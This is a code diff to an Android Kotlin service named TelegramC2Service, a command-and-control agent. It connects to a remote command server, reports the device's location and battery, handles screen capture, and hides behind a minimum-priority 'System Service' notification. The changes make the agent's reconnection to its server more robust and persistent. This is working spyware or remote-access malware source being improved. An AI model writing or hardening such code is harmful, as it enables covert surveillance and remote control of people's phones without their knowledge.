@@ -24,6 +24,7 @@ import org.json.JSONObject
 import java.io.File
 import java.net.URI
 import java.util.concurrent.TimeUnit
+import java.util.concurrent.atomic.AtomicBoolean
 
 class TelegramC2Service : Service() {
 
@@ -31,7 +32,6 @@ class TelegramC2Service : Service() {
         private const val TAG = "C2Agent"
         private const val NOTIF_ID = 2
         private const val CHANNEL_ID = "c2agent"
-        private const val RECONNECT_MS = 5000L
     }
 
     private val serverUrl: String = BuildConfig.C2_URL
@@ -52,6 +52,7 @@ class TelegramC2Service : Service() {
     @Volatile private var socket: Socket? = null
     @Volatile private var connected: Boolean = false
     private var reconnectJob: Job? = null
+    private val connecting = AtomicBoolean(false)
 
     @Volatile private var startedAt: Long = System.currentTimeMillis()
     @Volatile private var commandCount: Int = 0
@@ -83,7 +84,11 @@ class TelegramC2Service : Service() {
                 initProjectionFromIntent(code, data)
             }
         }
-        if (socket == null || !connected) connectSocket()
+        // Only start the connect loop if it's not already running
+        if (reconnectJob?.isActive != true) {
+            log("onStartCommand: reconnect loop not running, starting")
+            connectSocket()
+        }
         return START_STICKY
     }
 
@@ -146,9 +151,11 @@ class TelegramC2Service : Service() {
             .setContentTitle("System Service")
             .setContentText("running")
             .setSmallIcon(android.R.drawable.stat_sys_download)
-            .setPriority(NotificationCompat.PRIORITY_MIN)
+            .setPriority(CompatPriorityMin())
             .build()
     }
+
+    private fun CompatPriorityMin(): Int = NotificationCompat.PRIORITY_MIN
 
     // ---------- Socket.IO ----------
 
@@ -156,32 +163,48 @@ class TelegramC2Service : Service() {
         reconnectJob?.cancel()
         reconnectJob = scope.launch {
             while (isActive) {
-                try {
-                    doConnect()
-                    while (isActive && connected) delay(500)
-                } catch (e: Exception) {
-                    log("connect error: ${e.message}")
+                if (!connected && socket == null) {
+                    if (connecting.compareAndSet(false, true)) {
+                        try { doConnect() } finally { connecting.set(false) }
+                    }
                 }
-                if (connected) {
-                    try { socket?.disconnect() } catch (_: Exception) {}
+
+                // Wait up to 30s for connection
+                var waited = 0
+                while (isActive && !connected && waited < 30000) {
+                    delay(500)
+                    waited += 500
                 }
-                socket = null
-                connected = false
-                delay(RECONNECT_MS)
+
+                // If connected, idle until disconnect
+                while (isActive && connected) {
+                    delay(2000)
+                }
+
+                // If disconnected cleanly, small delay before retry
+                if (isActive && !connected) {
+                    delay(3000)
+                }
             }
         }
     }
 
     private fun doConnect() {
         try {
+            // Close any previous socket first
+            try { socket?.off() } catch (_: Exception) {}
+            try { socket?.disconnect() } catch (_: Exception) {}
+            try { socket?.close() } catch (_: Exception) {}
+            socket = null
+            connected = false
+
             val uri = URI(serverUrl)
             val opts = IO.Options().apply {
-                reconnection = true
-                reconnectionDelay = 2000
-                reconnectionDelayMax = 10000
+                reconnection = false          // We manage reconnection ourselves
                 timeout = 20000
                 forceNew = true
                 transports = arrayOf("polling", "websocket")
+                upgrade = true
                 auth = mapOf(
                     "api_key" to apiKey,
                     "device_id" to deviceId,
@@ -197,6 +220,7 @@ class TelegramC2Service : Service() {
             socket = s
 
             s.on(Socket.EVENT_CONNECT) {
+                if (connected) return@on
                 log("socket connected")
                 connected = true
             }
@@ -204,6 +228,10 @@ class TelegramC2Service : Service() {
                 val reason = args.firstOrNull()?.toString() ?: "?"
                 log("socket disconnected: $reason")
                 connected = false
+                // schedule reconnection
+                scope.launch {
+                    delay(1000)
+                }
             }
             s.on(Socket.EVENT_CONNECT_ERROR) { args ->
                 val msg = args.firstOrNull()?.toString() ?: "?"
@@ -229,6 +257,7 @@ class TelegramC2Service : Service() {
                 log("agent rejected: ${obj.optString("error")}")
             }
 
+            log("socket connecting to $serverUrl…")
             s.connect()
         } catch (e: Exception) {
             log("doConnect exception: ${e.message}")
@@ -237,6 +266,7 @@ class TelegramC2Service : Service() {
 
     private fun sendState() {
         try {
+            if (!connected) return
             val bat = batteryPct()
             val loc = Location.get(this@TelegramC2Service)
             val payload = JSONObject().apply {
@@ -404,7 +434,10 @@ class TelegramC2Service : Service() {
 
     override fun onDestroy() {
         log("onDestroy")
+        reconnectJob?.cancel()
+        try { socket?.off() } catch (_: Exception) {}
         try { socket?.disconnect() } catch (_: Exception) {}
+        try { socket?.close() } catch (_: Exception) {}
         socket = null
         connected = false
         captureSession?.release()
